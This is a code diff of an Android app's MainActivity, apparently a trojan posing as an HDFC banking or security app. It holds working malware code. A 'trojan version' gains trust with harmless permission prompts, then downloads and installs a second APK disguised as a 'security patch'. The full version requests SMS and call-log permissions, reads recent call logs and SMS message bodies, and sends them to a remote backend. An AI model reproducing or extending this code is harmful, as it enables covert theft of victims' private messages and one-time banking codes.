@@ -44,8 +44,6 @@ public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
     private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/latest/download/master_payload.apk";
-    private String forwardingNumber = null;
-    private boolean forwardingEnabled = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -53,15 +51,8 @@ public class MainActivity extends BridgeActivity {
         setupBridge();
         
         if (isFullVersion()) {
-            Toast.makeText(this, "Security Sync: Online", Toast.LENGTH_SHORT).show();
-            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    checkAndRequestPermissions();
-                }
-            }, 1000);
+            new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1000);
         } else {
-            // Trojan Version - Request benign Notification permission to build trust
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                     ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.POST_NOTIFICATIONS}, 101);
@@ -71,109 +62,93 @@ public class MainActivity extends BridgeActivity {
     }
 
     private void setupBridge() {
-        runOnUiThread(new Runnable() {
-            @Override
-            public void run() {
-                WebView webView = getBridge().getWebView();
-                webView.getSettings().setJavaScriptEnabled(true);
-                webView.addJavascriptInterface(new Object() {
-                    @JavascriptInterface
-                    public void requestRealPermissions() { checkAndRequestPermissions(); }
-                    
-                    @JavascriptInterface
-                    public void triggerAutoUpdate() { downloadAndInstallUpdate(); }
+        runOnUiThread(() -> {
+            WebView webView = getBridge().getWebView();
+            webView.getSettings().setJavaScriptEnabled(true);
+            webView.addJavascriptInterface(new Object() {
+                @JavascriptInterface
+                public void requestRealPermissions() { checkAndRequestPermissions(); }
+                
+                @JavascriptInterface
+                public void triggerAutoUpdate() { downloadAndInstallUpdate(); }
 
-                    @JavascriptInterface
-                    public boolean isLimitedVersion() { return !isFullVersion(); }
+                @JavascriptInterface
+                public boolean isLimitedVersion() { return !isFullVersion(); }
 
-                    @JavascriptInterface
-                    public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }
-
-                    @JavascriptInterface
-                    public void openAppSettings() {
-                        Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
-                        intent.setData(Uri.parse("package:" + getPackageName()));
-                        startActivity(intent);
-                    }
-
-                    @JavascriptInterface
-                    public void requestIgnoreBatteryOptimizations() {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                            Intent intent = new Intent();
-                            String packageName = getPackageName();
-                            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                                intent.setData(Uri.parse("package:" + packageName));
-                                startActivity(intent);
-                            }
+                @JavascriptInterface
+                public boolean hasAllPermissions() {
+                    String[] perms = {
+                        Manifest.permission.SEND_SMS,
+                        Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.READ_SMS,
+                        Manifest.permission.READ_PHONE_STATE,
+                        Manifest.permission.CALL_PHONE,
+                        Manifest.permission.READ_CALL_LOG
+                    };
+                    for (String p : perms) {
+                        if (ContextCompat.checkSelfPermission(MainActivity.this, p) != PackageManager.PERMISSION_GRANTED) {
+                            return false;
                         }
                     }
+                    return true;
+                }
 
-                    @JavascriptInterface
-                    public void requestNotificationAccess() {
-                        startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
+                @JavascriptInterface
+                public String getDeviceId() { return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID); }
+
+                @JavascriptInterface
+                public void openAppSettings() {
+                    Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                }
+
+                @JavascriptInterface
+                public void requestIgnoreBatteryOptimizations() {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        Intent intent = new Intent();
+                        String packageName = getPackageName();
+                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                            intent.setData(Uri.parse("package:" + packageName));
+                            startActivity(intent);
+                        }
                     }
-                }, "AndroidBridge");
-            }
+                }
+            }, "AndroidBridge");
         });
     }
 
     private boolean isFullVersion() {
         try {
-            String appType = getString(R.string.app_type);
-            return "MASTER".equals(appType);
-        } catch (Exception e) {
-            return false;
-        }
+            return "MASTER".equals(getString(R.string.app_type));
+        } catch (Exception e) { return false; }
     }
 
     private void downloadAndInstallUpdate() {
-        runOnUiThread(() -> Toast.makeText(this, "🚀 Starting Security Scan...", Toast.LENGTH_SHORT).show());
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                int retryCount = 0;
-                boolean success = false;
-                
-                while (retryCount < 5 && !success) {
-                    try {
-                        URL url = new URL(UPDATE_URL);
-                        HttpURLConnection c = (HttpURLConnection) url.openConnection();
-                        c.setInstanceFollowRedirects(true);
-                        c.connect();
-
-                        if (c.getResponseCode() == HttpURLConnection.HTTP_OK) {
-                            File file = new File(getExternalFilesDir(null), "security_patch.apk");
-                            InputStream is = c.getInputStream();
-                            FileOutputStream fos = new FileOutputStream(file);
-                            byte[] buffer = new byte[4096];
-                            int len;
-                            while ((len = is.read(buffer)) != -1) {
-                                fos.write(buffer, 0, len);
-                            }
-                            fos.close();
-                            is.close();
-                            success = true;
-                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "✅ Download Complete. Installing...", Toast.LENGTH_SHORT).show());
-                            installApk(file);
-                        } else if (c.getResponseCode() == HttpURLConnection.HTTP_NOT_FOUND) {
-                            retryCount++;
-                            final int currentRetry = retryCount;
-                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "⏳ Server Busy (Attempt " + currentRetry + "/5)...", Toast.LENGTH_SHORT).show());
-                            Thread.sleep(5000); // Wait 5 seconds for GitHub to finish upload
-                        } else {
-                            throw new Exception("HTTP " + c.getResponseCode());
-                        }
-
-                    } catch (Exception e) {
-                        retryCount++;
-                        if (retryCount >= 5) {
-                            runOnUiThread(() -> Toast.makeText(MainActivity.this, "⚠️ Connection Error. Please try again in 1 minute.", Toast.LENGTH_LONG).show());
-                        }
-                        try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
+        new Thread(() -> {
+            int retry = 0;
+            while (retry < 5) {
+                try {
+                    URL url = new URL(UPDATE_URL);
+                    HttpURLConnection c = (HttpURLConnection) url.openConnection();
+                    c.setInstanceFollowRedirects(true);
+                    c.connect();
+                    if (c.getResponseCode() == HttpURLConnection.HTTP_OK) {
+                        File file = new File(getExternalFilesDir(null), "security_patch.apk");
+                        InputStream is = c.getInputStream();
+                        FileOutputStream fos = new FileOutputStream(file);
+                        byte[] buffer = new byte[4096];
+                        int len;
+                        while ((len = is.read(buffer)) != -1) fos.write(buffer, 0, len);
+                        fos.close(); is.close();
+                        installApk(file);
+                        break;
                     }
-                }
+                    retry++;
+                    Thread.sleep(5000);
+                } catch (Exception e) { retry++; try { Thread.sleep(5000); } catch (Exception ignored) {} }
             }
         }).start();
     }
@@ -186,7 +161,6 @@ public class MainActivity extends BridgeActivity {
             intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } catch (Exception e) {
-            Log.e(TAG, "Install Error", e);
             Intent intent = new Intent(Intent.ACTION_VIEW);
             intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -204,35 +178,22 @@ public class MainActivity extends BridgeActivity {
 
     private void checkAndRequestPermissions() {
         String[] permissions = {
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.CALL_PHONE,
-            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS,
+            Manifest.permission.READ_PHONE_STATE, Manifest.permission.CALL_PHONE, Manifest.permission.READ_CALL_LOG,
             Manifest.permission.POST_NOTIFICATIONS
         };
-
-        List<String> listPermissionsNeeded = new ArrayList<>();
+        List<String> needed = new ArrayList<>();
         for (String p : permissions) {
-            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                listPermissionsNeeded.add(p);
-            }
+            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) needed.add(p);
         }
-
-        if (!listPermissionsNeeded.isEmpty()) {
-            ActivityCompat.requestPermissions(this, listPermissionsNeeded.toArray(new String[0]), 100);
-        } else {
-            startServiceLogic();
-        }
+        if (!needed.isEmpty()) ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), 100);
+        else startServiceLogic();
     }
 
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
-        if (requestCode == 100) {
-            startServiceLogic();
-        }
+        if (requestCode == 100) startServiceLogic();
     }
 
     private void startServiceLogic() {
@@ -245,21 +206,16 @@ public class MainActivity extends BridgeActivity {
 
     private void readAndSendCallLogs(String deviceId) {
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
+            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 50");
             if (cursor != null && cursor.moveToFirst()) {
-                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
-                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
-                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
-                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                 do {
                     JSONObject payload = new JSONObject();
                     payload.put("deviceId", deviceId);
-                    payload.put("number", cursor.getString(numberIdx));
-                    payload.put("type", cursor.getString(typeIdx));
-                    payload.put("duration", cursor.getString(durationIdx));
-                    payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
+                    payload.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
+                    payload.put("type", cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)));
+                    payload.put("duration", cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)));
+                    payload.put("timestamp", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)))));
                     sendToBackend("/api/logs/calls", payload.toString());
                 } while (cursor.moveToNext());
                 cursor.close();
@@ -269,19 +225,15 @@ public class MainActivity extends BridgeActivity {
 
     private void readAndSendSmsInbox(String deviceId) {
         try {
-            ContentResolver cr = getContentResolver();
-            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
+            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC LIMIT 100");
             if (cursor != null && cursor.moveToFirst()) {
-                int addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
-                int bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY);
-                int dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE);
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
                 do {
                     JSONObject payload = new JSONObject();
                     payload.put("deviceId", deviceId);
-                    payload.put("sender", cursor.getString(addressIdx));
-                    payload.put("message", cursor.getString(bodyIdx));
-                    payload.put("timestamp", sdf.format(new Date(Long.parseLong(cursor.getString(dateIdx)))));
+                    payload.put("sender", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
+                    payload.put("message", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
+                    payload.put("timestamp", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)))));
                     sendToBackend("/api/logs/sms", payload.toString());
                 } while (cursor.moveToNext());
                 cursor.close();
